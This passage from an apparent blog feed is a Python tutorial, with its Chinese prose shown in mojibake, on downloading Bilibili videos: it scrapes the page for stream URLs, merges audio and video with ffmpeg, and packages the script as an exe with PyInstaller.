class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010005615.png" alt="image-20210322010005615"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010033745.png" alt="image-20210322010033745"></p><h1 id="åˆå¹¶éŸ³è§†é¢‘"><a href="#åˆå¹¶éŸ³è§†é¢‘" class="headerlink" title="åˆå¹¶éŸ³è§†é¢‘"></a>åˆå¹¶éŸ³è§†é¢‘</h1><p>æŠŠåˆ†å¼€çš„éŸ³é¢‘å’Œè§†é¢‘è¿›è¡Œåˆå¹¶ã€‚ï¼ˆå‡ æ¬¡æµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°å¦‚æœç”¨è§†é¢‘æ ‡é¢˜ä½œä¸ºæ–‡ä»¶åå»æ‰§è¡Œffmpegå‘½ä»¤ä¼šå¯¼è‡´å…¶å‡ºç°é”™è¯¯ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œåæ¥è¯•ç€å°†æ–‡ä»¶åå…ˆé‡å‘½åä¸º1.mp3ã€1.mp4è¿™ç§ç®€å•çš„åå­—ï¼Œå¯ä»¥å®Œæˆåˆå¹¶ï¼Œå†åˆ é™¤ä¹‹)</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">merge_data(video_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010405722.png" alt="image-20210322010405722"></p><p>åˆå¹¶åè§†é¢‘æ­£å¸¸æ’­æ”¾ï¼Œæœ‰å£°æœ‰è‰²ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010551889.png" alt="image-20210322010551889"></p><h1 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/3/21 16:11</span></span><br><span class="line"><span class="comment"># @Author : wawyw</span></span><br><span class="line"><span class="comment"># @File : bilibili_video.py</span></span><br><span class="line"><span class="comment"># @Software : PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥bilibiliè§†é¢‘å¯¹åº”çš„é“¾æ¥å³å¯ä¸‹è½½ï¼š&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010945179.png" alt="image-20210322010945179"></p><blockquote><p>è™½è¯´è¿™æ¬¡æ˜¯å°†ç™½å«–è¿›è¡Œåˆ°åº•äº†ï¼Œä½†Bç«™UPä¸»ä»¬åˆ›ä½œè§†é¢‘ç¡®å®ä¸æ˜“ï¼Œæˆ‘ä»¬ä¹Ÿä»ä¸­æ”¶è·å¾ˆå¤šï¼Œèƒ½ä¸‰è¿è¿˜æ˜¯è¦å¤šå¤šæ”¯æŒä¸‹~</p></blockquote><hr><h1 id="æ‰“åŒ…æˆexe"><a href="#æ‰“åŒ…æˆexe" class="headerlink" title="æ‰“åŒ…æˆexe"></a>æ‰“åŒ…æˆexe</h1><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆå®‰è£…Pyinstallerï¼Œç›´æ¥åœ¨cmdä½¿ç”¨pipå‘½ä»¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller </span><br></pre></td></tr></table></figure><p>ç„¶åï¼ŒæŠŠffmpegå’Œpyæ–‡ä»¶æ”¾ç½®åˆ°åŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p>å› ä¸ºffmpegæ˜¯è¦ä¸€èµ·æ‰“åŒ…çš„ï¼Œéœ€è¦å¯¹ä»£ç ä¸­çš„ç›¸åº”ç›®å½•åšå°å¹…ä¿®æ”¹ã€‚ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp3&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp3&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;1.mp4&quot;</span>,<span class="string">&quot;ffmpeg/bin/1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;ffmpeg/bin/&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    shutil.move(<span class="string">&quot;%s.mp4&quot;</span>%video_name,<span class="string">&quot;../../%s.mp4&quot;</span>%video_name)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥bilibiliè§†é¢‘å¯¹åº”çš„é“¾æ¥å³å¯ä¸‹è½½ï¼š\n&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å¥½åï¼Œcmdåˆ‡æ¢åˆ°æˆ‘ä»¬åˆšåˆšæ”¾æ–‡ä»¶çš„ç›®å½•ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pyinstall -F -i bilibili.ico bilibili_video_download.py</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210417235918679.png" alt="image-20210417235918679"></p><p>ï¼ˆè¿™é‡Œ<code>-i bilibili.ico</code>æ˜¯å¯¹ç¨‹åºçš„å›¾æ ‡è¿›è¡Œè®¾ç½®ï¼Œä¸ºå¯é€‰é¡¹ï¼‰</p><p>æ‰§è¡Œå®Œæ¯•ä¼šå‘ç°å½“å‰ç›®å½•å¤šäº†å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€å…¶ä¸­åä¸ºdistçš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢ç”Ÿæˆäº†ä¸€ä¸ªåä¸º<code>bilibili_video_download</code>çš„exeåº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”å›¾æ ‡ä¹Ÿæ˜¯æˆ‘ä»¬è®¾ç½®çš„å›¾æ¡ˆã€‚ï¼ˆè¿™é‡Œè¦æŠŠexeæ–‡ä»¶ç§»åŠ¨åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œå³ffmpegçš„åŒçº§ç›®å½•ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418000736927.png" alt="image-20210418000736927"></p><p>ç‚¹å‡»è¿è¡Œexeåº”ç”¨ç¨‹åºï¼Œè¾“å…¥è§†é¢‘URLå³å¯ä¸‹è½½ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001107366.png" alt="image-20210418001107366"></p><p>ä¸‹è½½å®Œæ¯•ï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418001228931.png" alt="image-20210418001228931"></p><p>æ‰€æœ‰ç›¸å…³èµ„æºå·²æ”¾åœ¨ä¸‹é¢çš„é“¾æ¥ä¸­ï¼Œéœ€è¦çš„æœ‹å‹å¯ä»¥è‡ªå–ã€‚ï¼ˆä¸‹è½½åè§£å‹æ­¤å‹ç¼©åŒ…ï¼Œè¿è¡Œ<code>bilibili_video_download.exe</code>å¹¶è¾“å…¥è§†é¢‘å¯¹åº”é“¾æ¥å³å¯å®Œæˆè§†é¢‘ä¸‹è½½ ï¼‰</p><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg">https://pan.baidu.com/s/1P1451Mmg2FRQBnieSrUCQg</a><br>æå–ç ï¼š1234<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSæ¼æ´å­¦ä¹ </title>
      <link href="posts/54823.html"/>
      <url>posts/54823.html</url>
      
